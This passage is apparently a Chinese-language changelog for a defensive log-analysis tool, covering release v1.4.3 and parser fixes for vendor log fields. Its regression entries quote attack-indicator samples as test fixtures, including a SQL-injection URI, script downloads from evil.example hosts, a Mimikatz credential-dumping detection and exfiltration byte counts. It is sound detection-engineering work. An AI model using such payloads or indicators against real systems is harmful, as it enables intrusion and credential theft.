# BLA Optimization Plan

## 2026-05-29 - v1.4.3 Release Closure

### 本轮目标
- 将已通过验证的 CLI、JSON 输出、输出安全、Shell 外传检测和 P0/HVV 字段兼容优化收口为 `v1.4.3`。
- 补齐发布说明、README 摘要和 release gate smoke，确保新能力进入发布前自动验证。
- 明确 `soft-copyright-materials/` 是本地软著材料，不进入 BLA 运行时代码或发布包。

### 涉及模块
- `bla/__version__.py`
- `README.md`
- `docs/releases/v1.4.3.md`
- `scripts/release_check.py`
- `.gitignore`
- `BLA_OPTIMIZATION_PLAN.md`

### 风险边界
- 本轮只做发布收口，不新增联网行为，不改变 HTML 离线交付边界。
- 不改变 remote 只读、白名单、超时、限量和审计边界。
- 不把本地软著材料纳入发布提交或包产物。

### 验证命令
- `python3 scripts/release_check.py --build`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 bla_cli.py validate-rules --strict-metadata`

### 验证结果
- `python3 scripts/release_check.py --build` 通过。
- 发布门禁已覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、`ssh --help`、`remote-log --help`、1 MB benchmark、1 MB memory benchmark、样例报告 smoke、v1.4.1/v1.4.2/v1.4.3 smoke、wheel/sdist build 和 `twine check`。
- `python3 bla_cli.py --version` 输出 `BLA 1.4.3`。
- `git diff --check` 通过。
- GitHub Release 触发的 Publish workflow 已成功发布到 PyPI。
- 首次 push Tests workflow 在 Windows pytest 阶段失败，原因是测试 fixture 使用了 Windows 文件系统不允许的 ESC/BEL 路径名；已改为平台安全的恶意路径测试，并重新通过本地定点回归和 `release_check.py --build`。
- 修复后的 GitHub Tests workflow `26638972410` 已通过，覆盖 Ubuntu/macOS/Windows 与 Python 3.9-3.12。
- PyPI 干净虚拟环境安装验证通过：`blueteam-log-analyzer==1.4.3` 可安装，`bla --version` 输出 `BLA 1.4.3`，`validate-rules --strict-metadata`、`ssh --help`、`remote-log --help` 和样例分析均通过。

### 修改结果
- 已将版本号提升到 `1.4.3`。
- 已新增 `docs/releases/v1.4.3.md`，README 当前版本摘要改为 v1.4.3。
- 已将 `scripts/release_check.py` 增加 v1.4.3 冒烟场景，覆盖 JSON 事件限量、raw_line 限长、Shell 外传、Proxy/SWG `request_url`、Firewall `policy_action`、VPN `auth_result` 等链路。
- 已将 `soft-copyright-materials/` 加入 `.gitignore`，避免本地软著材料进入 BLA 发布提交或包产物。
- 已将终端清洗相关测试里的恶意文件名改为 Windows 可创建的路径片段，仍保留 secret 脱敏断言；非 Windows 平台继续覆盖 ESC/BEL 控制字符路径。

### 剩余问题
- `v1.4.3` 已发布；本轮未发现 P0/P1 已知问题。
- 历史中保留一次已修复的 Windows Tests 失败 run `26638772645`，后续 run `26638972410` 已通过。

## 2026-05-29 - P0 Proxy Vendor Request URL Fields

### 本轮目标
- 修复代理/SWG 日志中 URL 写在 `request_url` / `request_uri` 等厂商字段时，可执行/脚本下载不会生成事件的问题。
- 保留这类字段中的目标域名，避免恶意分类事件进入 `P0-C2-001` 时证据目标为空。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 Proxy/SWG adapter 的 URL 字段别名和统一 `details.url` 归一；Detector 仍通过既有 selector 聚合。
- 不改变 proxy 大流量外发方向判定、WAF、DNS、firewall、EDR、bastion、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_proxy_vendor_request_url_fields_preserve_target_and_download_detection`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_proxy_vendor_request_url_fields_preserve_target_and_download_detection`。
- P0 回归通过：`tests/test_p0_security.py` 共 36 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`log_type=proxy request_url=https://download.evil.example/tool.ps1` 不生成下载事件；`request_url=https://beacon.evil.example/a url_category=Malware threat_category=C2` 生成事件但目标为空。
- 已将 Proxy/SWG adapter 的 URL 字段扩展到 `request_url/request_uri/full_url` 等常见厂商别名。
- 已让这些 URL 字段参与可疑 URL/脚本下载检测、目标域名提取和统一 `details.url` 归一。
- 已新增回归测试，覆盖 `request_url` 脚本下载事件、恶意分类事件目标域名保留、URL 归一和既有 `P0-C2-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的多文件改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 Application Vendor Auth Result Fields

### 本轮目标
- 修复应用审计日志中认证结果写在 `auth_result` / `login_status` / `auth_status` 等厂商字段时，登录失败事件不生成的问题。
- 保留 `service_name` / `app_name` 这类业务服务字段，避免应用认证事件缺少业务系统上下文。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 Application adapter 的认证结果、失败原因和服务名字段别名；Detector 仍通过既有 `failed-login` selector 聚合。
- 不改变 VPN、WAF、DNS、firewall、proxy、EDR、bastion、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_application_vendor_auth_result_fields_feed_brute_force_detection`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_application_vendor_auth_result_fields_feed_brute_force_detection`。
- P0 回归通过：`tests/test_p0_security.py` 共 35 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：5 条 `log_type=app event_type=login auth_result=failed service_name=portal` 登录失败不会生成事件，也不会触发 `BRUTE-001`。
- 已将 Application adapter 的认证结果字段扩展到 `auth_result/login_result/auth_status/login_status` 等常见厂商别名。
- 已将认证原因字段扩展到 `auth_reason/failure_reason`，并将业务上下文字段扩展到 `service_name/app_name/application_name`。
- 已新增回归测试，覆盖 5 次厂商字段应用登录失败事件生成、业务系统上下文、用户/IP 保留、`failed-login` 标签和既有 `BRUTE-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的多文件改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 Bastion Vendor Operation Fields

### 本轮目标
- 修复堡垒机审计中 `operation_type=file_download/file_upload` 且无 `command` 字段时不会生成文件传输事件的问题。
- 保留 `target_asset` / `asset_name` 这类目标资产字段，避免堡垒机事件缺失目标主机。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 Bastion adapter 的操作、文件和目标资产字段别名；Detector 仍通过既有 `bastion-command` selector 生成 `P0-BASTION-001`。
- 不改变 VPN、WAF、DNS、firewall、proxy、EDR、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_bastion_vendor_operation_type_file_transfer_is_detected`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_bastion_vendor_operation_type_file_transfer_is_detected`。
- P0 回归通过：`tests/test_p0_security.py` 共 34 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`type=bastion operation_type=file_download target_asset=10.0.0.5 file_name=/tmp/db.sql` 不生成事件，也不会触发 `P0-BASTION-001`。
- 已将 Bastion adapter 的操作字段扩展到 `action_type/event_action/operation_type/activity` 等常见厂商别名。
- 已将目标资产字段扩展到 `target_asset/asset_name/dst_ip/dest_ip` 等别名，并扩展文件字段到 `source_file/target_file`。
- 已新增回归测试，覆盖无 command 的厂商字段文件下载事件生成、目标资产保留、操作者保留、`file-transfer` 标签和既有 `P0-BASTION-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的多文件改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 VPN Vendor Auth Result Fields

### 本轮目标
- 修复 VPN/SSLVPN 日志中认证结果写在 `auth_result` / `login_status` / `auth_status` 等厂商字段时，登录失败事件不生成的问题。
- 让这类 VPN 失败继续通过既有 `failed-login` 标签进入 `BRUTE-001` / `SPRAY-001` 检测，不新增 detector 分支。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 VPN adapter 的认证结果和原因字段别名；Detector 仍通过既有 registry 和 `failed-login` selector 聚合。
- 不改变 WAF、DNS、firewall、proxy、EDR、bastion、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_vpn_vendor_auth_result_fields_feed_brute_force_detection`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_vpn_vendor_auth_result_fields_feed_brute_force_detection`。
- P0 回归通过：`tests/test_p0_security.py` 共 33 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：5 条 `log_type=vpn auth_result=failed` 登录失败不会生成事件，也不会触发 `BRUTE-001`。
- 已将 VPN adapter 的认证结果字段扩展到 `auth_result/login_result/auth_status/login_status` 等常见厂商别名。
- 已将 VPN 认证原因字段扩展到 `auth_reason/failure_reason` 等别名，保留失败原因上下文。
- 已新增回归测试，覆盖 5 次厂商字段登录失败事件生成、用户/IP 保留、`failed-login` 标签和既有 `BRUTE-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的多文件改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 Firewall Vendor Action Fields

### 本轮目标
- 修复防火墙/NAT 日志中动作写在 `policy_action` / `event_action` / `rule_action` 等厂商字段时，敏感端口放行被降级为“动作未知”的问题。
- 保持 `action` 缺失时的保守中危判定，不把未知动作误报成放行。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 Firewall/NAT adapter 的动作字段别名；Detector 仍通过既有 `exposed-service` selector 生成 `P0-FW-001`。
- 不改变 firewall 大流量外联、proxy/WAF/DNS/EDR、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_firewall_vendor_policy_action_fields_promote_exposed_service`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_firewall_vendor_policy_action_fields_promote_exposed_service`。
- P0 回归通过：`tests/test_p0_security.py` 共 32 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`log_type=firewall dst_port=3389 policy_action=allow` 被解析为 `防火墙敏感端口访问（动作未知）`，未带 `exposed-service`，也未触发 `P0-FW-001`。
- 已将 Firewall/NAT adapter 的动作字段扩展到 `policy_action/event_action/rule_action/session_action` 等常见厂商别名。
- 已新增回归测试，覆盖敏感端口放行、`exposed-service` 标签、归一化 action 保留和既有 `P0-FW-001` 告警聚合。
- 保留缺失动作字段时的 `防火墙敏感端口访问（动作未知）` 中危保守判定。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的多文件改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 WAF Vendor Request Fields

### 本轮目标
- 修复 WAF 日志中攻击 URI 和攻击名称写在 `request_uri` / `request_url` / `attack_name` 等厂商字段时被降级为普通拦截的问题。
- 保留 `src_addr` / `source_addr` 这类源地址字段，避免 WAF 事件缺失攻击源 IP。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 WAF adapter 的请求、攻击标签和源 IP 字段别名；Detector 仍通过既有 registry 和 `web-attack` selector 聚合。
- 不改变 DNS、proxy、EDR、firewall、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_waf_vendor_request_fields_preserve_sqli_and_source_ip`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_waf_vendor_request_fields_preserve_sqli_and_source_ip`。
- P0 回归通过：`tests/test_p0_security.py` 共 31 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`log_type=waf src_addr=203.0.113.8 request_uri="/login?id=1 UNION SELECT NULL--" attack_name="SQL Injection"` 被降级为 `WAF 拦截/告警`，且源 IP 为空。
- 已将 WAF adapter 的请求、攻击标签和路径字段扩展到常见厂商别名，包括 `request_uri/request_url/full_url/attack_name/attack_type/signature_name/rule_name/user_agent`。
- 已将统一源 IP 提取扩展到 `src_addr/source_addr/client_addr`。
- 已新增回归测试，覆盖 SQL 注入分类、源 IP 保留、`web-attack/blocked` 标签、攻击 URI 展示和厂商字段保留。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 DNS Vendor Category Fields

### 本轮目标
- 修复 DNS 安全日志中恶意分类写在 `threat_category` / `domain_category` / `query_category` 等厂商字段时不会生成 C2/恶意域名事件的问题。
- 让这类 DNS 命中继续通过既有 `c2` 标签进入 `P0-C2-001`，不新增 detector 分支。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 DNS adapter 的查询、分类、rcode 和响应 IP 字段别名；Detector 仍通过既有 registry 和 `c2/dns-tunnel` selector 聚合。
- 不改变 proxy、EDR、WAF、firewall、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_dns_vendor_category_fields_promote_c2_alert`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_dns_vendor_category_fields_promote_c2_alert`。
- P0 回归通过：`tests/test_p0_security.py` 共 30 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`log_type=dns query=beacon.evil.example threat_category=C2` 不生成事件，也不会触发 `P0-C2-001`。
- 已将 DNS adapter 的查询、分类、rcode 和响应 IP 字段扩展到常见厂商别名，包括 `dns_query/rrname/threat_category/domain_category/query_category/dns_category/response_code/resolved_ip/response_ip`。
- 已新增回归测试，覆盖 DNS 事件生成、源 IP 保留、`dns/c2` 标签、厂商分类字段保留和既有 `P0-C2-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 EDR Detection Name Fields

### 本轮目标
- 修复 EDR/XDR 结构化日志中凭据转储线索写在 `detection_name` / `process_name` / `technique_id` 等厂商字段时不会生成事件的问题。
- 让这类 EDR 告警继续通过既有 `edr/malware-indicator/lsass-dump` 标签进入 `P0-EDR-001` 和凭据访问检测，不新增 detector 分支。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 EDR/XDR adapter 的标题、文本、进程、命令和 MITRE 字段别名；Detector 仍通过既有 registry 和 selector 聚合。
- 不改变 WAF、VPN、proxy/firewall、bastion、application、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_edr_vendor_detection_fields_detect_credential_dumping`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_edr_vendor_detection_fields_detect_credential_dumping`。
- P0 回归通过：`tests/test_p0_security.py` 共 29 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`log_type=edr detection_name="Mimikatz credential dumping" process_name=mimikatz.exe technique_id=T1003.001` 不生成事件，也不会触发 EDR/P0 或凭据访问告警。
- 已将 EDR/XDR adapter 的标题、文本、进程、命令和 MITRE 字段扩展到常见厂商别名，包括 `detection_name/process_name/process_path/command_line/technique_id/mitre_id`。
- 已新增回归测试，覆盖 EDR 事件生成、CRITICAL 级别、MITRE 保留、进程字段保留、`malware-indicator/lsass-dump` 标签、既有 `P0-EDR-001` 和 `CRED-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 Proxy Vendor Category Fields

### 本轮目标
- 修复代理/SWG 日志中恶意分类写在 `url_category` / `threat_category` 等厂商字段时不会生成 C2/恶意 URL 事件的问题。
- 让这类代理命中继续通过既有 `c2` 标签进入 `P0-C2-001`，不新增 detector 分支。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 Proxy/SWG adapter 的分类文本字段归一化；Detector 仍通过既有 registry 和 `c2/dns-tunnel` selector 聚合。
- 不改变 proxy 大流量外发、下载可执行文件、WAF、firewall、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_proxy_vendor_category_fields_promote_c2_alert`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_proxy_vendor_category_fields_promote_c2_alert`。
- P0 回归通过：`tests/test_p0_security.py` 共 28 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`log_type=proxy url_category=Malware threat_category=C2` 不生成事件，也不会触发 `P0-C2-001`。
- 已将 Proxy/SWG adapter 的分类文本字段扩展到 `url_category/threat_category/risk_category/security_category/classification/verdict/disposition/policy/policy_action/rule/signature`。
- 已新增回归测试，覆盖事件字段、目标域名、`c2/malicious-url` 标签和既有 `P0-C2-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 Application Auth Event Fields

### 本轮目标
- 修复应用 P0 结构化日志中 `event=login_failed` / `event_type=auth_failure` 放置认证结果时不会生成登录失败事件的问题。
- 让应用登录失败继续通过既有 `failed-login` 标签进入暴力破解/喷洒检测，不新增 detector 分支。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只扩展 Application adapter 的认证字段归一化；Detector 仍通过既有 registry 和 `failed-login` selector 聚合。
- 不改变 VPN、堡垒机、WAF、EDR、proxy/firewall、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_application_auth_event_field_feeds_brute_force_detection`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_application_auth_event_field_feeds_brute_force_detection`。
- P0 回归通过：`tests/test_p0_security.py` 共 27 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：5 条 `log_type=app event=login_failed` 应用登录失败不会生成事件，也不会触发 `BRUTE-001`。
- 已将 Application adapter 的认证文本字段扩展到 `event/event_type/event_name/operation/activity/reason`。
- 已新增回归测试，覆盖应用登录失败事件生成、`failed-login/application` 标签和既有 `BRUTE-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮不会回退或清理这些现场状态。

## 2026-05-29 - P0 Bastion File Transfer Without Command

### 本轮目标
- 修复堡垒机审计中 `operation=file_upload/file_download` 且没有 `command` 字段时不会生成 P0 文件操作事件的问题。
- 让这类文件传输事件继续通过既有 `P0-BASTION-001` 检测规则聚合，不新增 detector 分支。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- Parser 只把堡垒机文件操作归一为 `LogEvent`；Detector 仍通过现有 registry 和 `bastion-command` selector 生成告警。
- 不改变命令审计、高危命令、登录成功/失败、correlation、output 或 remote 行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_bastion_file_transfer_without_command_is_detected`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_bastion_file_transfer_without_command_is_detected`。
- P0 回归通过：`tests/test_p0_security.py` 共 26 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`type=bastion operation=file_upload file_path=/tmp/db.sql` 且无 `command` 字段时不会生成事件，也不会触发 `P0-BASTION-001`。
- 已新增无命令字段的堡垒机文件传输识别，输出 `堡垒机文件传输` 事件，MITRE `T1105`，标签 `bastion-command/file-transfer/bastion`。
- 已新增回归测试，覆盖事件字段、文件路径保留和既有 `P0-BASTION-001` 告警聚合。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - P0 Proxy Request Body Bytes

### 本轮目标
- 修复 proxy/SWG 日志中 `request_body_bytes` / `req_body_bytes` 达到阈值时不会触发 P0 数据外传的问题。
- 保持 `body_bytes_sent` / `response_body_bytes` 这类响应体字段不作为外发字节，避免大下载或大响应误报。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- 只在 proxy/SWG P0 adapter 的 request-body 上传字节别名中扩展，不把该语义泛化到 firewall/NAT。
- 不改变 P0 外传阈值、detector 聚合、correlation 语义或 output 格式。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_proxy_request_body_bytes_do_not_count_response_body_bytes`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_proxy_request_body_bytes_do_not_count_response_body_bytes`。
- P0 回归通过：`tests/test_p0_security.py` 共 25 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`log_type=proxy request_body_bytes=209715200` 和 `req_body_bytes=209715200` 不生成 P0 外传事件，也不会触发 `P0-EXFIL-001`。
- 已将 proxy/SWG 的 request-body 字节别名纳入外发归一化，覆盖 `request_body_bytes/requestbodybytes/req_body_bytes/reqbodybytes`。
- 已新增回归测试，覆盖 request-body 上传触发、`body_bytes_sent/response_body_bytes` 不触发。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - P0 Outbound Originator Bytes

### 本轮目标
- 修复 Zeek/代理/防火墙类日志中 `direction=outbound/egress` 且 `orig_bytes` 达到阈值时不会触发 P0 数据外传的问题。
- 保持 `resp_bytes` / responder bytes 不作为外发字节，避免大下载或响应体误报。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- 只在明确外发方向时读取 `orig_bytes/origin_bytes/originator_bytes`，无方向字段时不把 originator bytes 当成外发。
- 不改变 P0 外传阈值、detector 聚合、correlation 语义或 output 格式。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_outbound_originator_bytes_do_not_count_response_bytes`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_outbound_originator_bytes_do_not_count_response_bytes`。
- P0 回归通过：`tests/test_p0_security.py` 共 24 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`direction=outbound orig_bytes=209715200` 的 proxy 记录和 `direction=egress orig_bytes=209715200` 的 firewall 记录不会生成 P0 外传事件，也不会触发 `P0-EXFIL-001`。
- 已新增明确外发方向下的 originator bytes 归一化，覆盖 `orig_bytes/origin_bytes/originator_bytes`。
- 已新增回归测试，覆盖 outbound/egress `orig_bytes` 触发、outbound `resp_bytes` 不触发、ingress `orig_bytes` 不触发。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - P0 Inbound Direction Veto For Byte Aliases

### 本轮目标
- 修复 P0 proxy/firewall 中明确外发字节别名绕过 `direction=inbound/ingress` 的问题，避免入站大流量被误报为数据外传。
- 保留无方向字段时对 `bytes_sent/upload_bytes/request_bytes` 等明确外发别名的兼容。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
